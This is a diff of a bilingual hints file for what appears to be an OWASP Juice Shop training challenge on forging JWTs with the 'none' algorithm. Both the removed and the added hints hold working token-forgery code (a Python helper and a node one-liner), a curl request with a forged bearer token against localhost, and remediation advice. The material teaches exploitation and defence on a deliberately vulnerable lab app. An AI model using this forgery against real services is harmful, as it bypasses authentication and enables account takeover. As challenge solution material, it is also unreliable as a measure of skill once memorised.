@@ -65,111 +65,45 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Construction du JWT
-      forge : Python helper :
-        ```python
-        import base64, json
-        h = json.dumps({"alg":"none","typ":"JWT"})
-        p = json.dumps({"data":{"email":"jwtn3d@juice-sh.op","id":1,"role":"admin"}})
-        b64 = lambda s: base64.urlsafe_b64encode(
-            s.encode()).rstrip(b'=').decode()
-        token = f"{b64(h)}.{b64(p)}."  # signature
-                                        # vide
-        print(token)
-        ```
-      Submit avec : `Authorization: Bearer
-      <forged-token>` sur n'importe quel endpoint
-      authenticated (ex. GET /rest/user/whoami).
-      Source serveur verifiee : routes/verify.ts:82
-      verifie alg='none' literal + email matches
-      /jwtn3d@/.
+      Un JWT a trois parties base64url separees par des points :
+      header.payload.signature. Mets alg a "none" dans le header, mets
+      data.email a jwtn3d@juice-sh.op dans le payload (garde iat et un
+      exp lointain, par ex. 9999999999), et laisse la signature VIDE
+      (termine par un point). Le serveur (routes/verify.ts, jwtChallenge)
+      resout si l'algorithme est "none" ET l'email correspond.
     text_en: |
-      Forge JWT
-      construction: Python helper:
-        ```python
-        import base64, json
-        h = json.dumps({"alg":"none","typ":"JWT"})
-        p = json.dumps({"data":{"email":"jwtn3d@juice-sh.op","id":1,"role":"admin"}})
-        b64 = lambda s: base64.urlsafe_b64encode(
-            s.encode()).rstrip(b'=').decode()
-        token = f"{b64(h)}.{b64(p)}."  # empty
-                                        # signature
-        print(token)
-        ```
-      Submit with: `Authorization: Bearer
-      <forged-token>` on any authenticated
-      endpoint (e.g., GET /rest/user/whoami).
-      Verified server source: routes/verify.ts:82
-      checks alg='none' literal + email matches
-      /jwtn3d@/.
+      A JWT has three base64url parts separated by dots:
+      header.payload.signature. Set alg to "none" in the header, set
+      data.email to jwtn3d@juice-sh.op in the payload (keep iat and a
+      far exp, e.g. 9999999999), and leave the signature EMPTY (end
+      with a dot). The server (routes/verify.ts, jwtChallenge) solves
+      if the algorithm is "none" AND the email matches.
     pedagogical_intent: |
-      Spell exact payload forge.
+      Give the token structure, the none-alg and the needed claims.
 
   N5:
     cost_pct: 50
     text_fr: |
-      Workflow complet :
-      1. Login Juice Shop (n'importe quel compte ;
-         /#/login avec admin/admin123 si solu).
-      2. F12 -> Application -> Local Storage -> copy
-         `token` value (c'est ton JWT valide).
-      3. Decode sur jwt.io ou via Python script.
-      4. Modifier header :
-         `{"alg":"none","typ":"JWT"}`. Modifier
-         payload `data.email` -> `jwtn3d@juice-sh.op`
-         (preserver autres fields).
-      5. Re-encoder header + payload en base64url
-         (sans padding `=`). Concatener
-         `header.payload.` (point final + signature
-         vide).
-      6. Submit toute requete authenticated avec
-         `Authorization: Bearer <forged_token>`.
-         Exemple : `curl -H "Authorization: Bearer
-         eyJhbGciOiJub25lIn0.eyJkYXRhIjp7ImVtYWls
-         IjoiandtbjNkQGp1aWNlLXNoLm9wIn19."
-         http://localhost:3000/rest/user/whoami`.
-      7. Le serveur (express-jwt 0.1.3 vulnerable)
-         accepte le token alg=none.
-      8. Le solve check (routes/verify.ts:82) :
-         alg=='none' && email matches /jwtn3d@/ ->
-         match -> challenge solve auto.
-      Source canonique : routes/verify.ts:82-83 +
-      108-130 (jwtChallenge function) + RFC 7519 +
-      CVE-2015-9235 (express-jwt 0.1.3).
-      Defense canonique : whitelist algorithms
-      explicit dans jwt.verify(), update express-jwt
-      >= 6.0, eviter alg=none entierement.
+      Solution (verifiee en recette sur Juice Shop 19.2.1) : forge le
+      token, par exemple
+        node -e "const b=s=>Buffer.from(s).toString('base64url');console.log(b('{\"alg\":\"none\",\"typ\":\"JWT\"}')+'.'+b('{\"data\":{\"email\":\"jwtn3d@juice-sh.op\"},\"iat\":1,\"exp\":9999999999}')+'.')"
+      puis envoie-le comme jeton : soit en en-tete
+      Authorization: Bearer <token>, soit en le mettant dans
+      localStorage sous la cle token puis en rechargeant. Le challenge
+      se resout a la premiere requete authentifiee. Sans exp lointain,
+      la verification echoue.
+      Defense : rejeter cote serveur l'algorithme "none" ; verifier la
+      signature avec une liste blanche d'algorithmes (RS256 attendu).
     text_en: |
-      Full workflow:
-      1. Login Juice Shop (any account; /#/login
-         with admin/admin123 if solved).
-      2. F12 -> Application -> Local Storage ->
-         copy `token` value (your valid JWT).
-      3. Decode on jwt.io or via Python script.
-      4. Modify header:
-         `{"alg":"none","typ":"JWT"}`. Modify
-         payload `data.email` -> `jwtn3d@juice-
-         sh.op` (preserve other fields).
-      5. Re-encode header + payload in base64url
-         (no `=` padding). Concatenate
-         `header.payload.` (trailing dot + empty
-         signature).
-      6. Submit any authenticated request with
-         `Authorization: Bearer <forged_token>`.
-         Example: `curl -H "Authorization: Bearer
-         eyJhbGciOiJub25lIn0.eyJkYXRhIjp7ImVtYWls
-         IjoiandtbjNkQGp1aWNlLXNoLm9wIn19."
-         http://localhost:3000/rest/user/whoami`.
-      7. Server (vulnerable express-jwt 0.1.3)
-         accepts alg=none token.
-      8. Solve check (routes/verify.ts:82):
-         alg=='none' && email matches /jwtn3d@/ ->
-         match -> challenge auto solves.
-      Canonical source: routes/verify.ts:82-83 +
-      108-130 (jwtChallenge function) + RFC 7519 +
-      CVE-2015-9235 (express-jwt 0.1.3).
-      Canonical defense: explicit algorithm
-      whitelist in jwt.verify(), update express-jwt
-      >= 6.0, avoid alg=none entirely.
+      Solution (verified during testing on Juice Shop 19.2.1): forge
+      the token, e.g.
+        node -e "const b=s=>Buffer.from(s).toString('base64url');console.log(b('{\"alg\":\"none\",\"typ\":\"JWT\"}')+'.'+b('{\"data\":{\"email\":\"jwtn3d@juice-sh.op\"},\"iat\":1,\"exp\":9999999999}')+'.')"
+      then send it as the token: either in an Authorization: Bearer
+      <token> header, or by placing it in localStorage under the key
+      token and reloading. The challenge solves on the first
+      authenticated request. Without a far exp, verification fails.
+      Defense: reject the "none" algorithm server-side; verify the
+      signature against an algorithm allowlist (RS256 expected).
     pedagogical_intent: |
-      Quasi-solution : workflow + curl + defense.
+      Full solution: verified forge command, delivery, exp caveat,
+      defense.
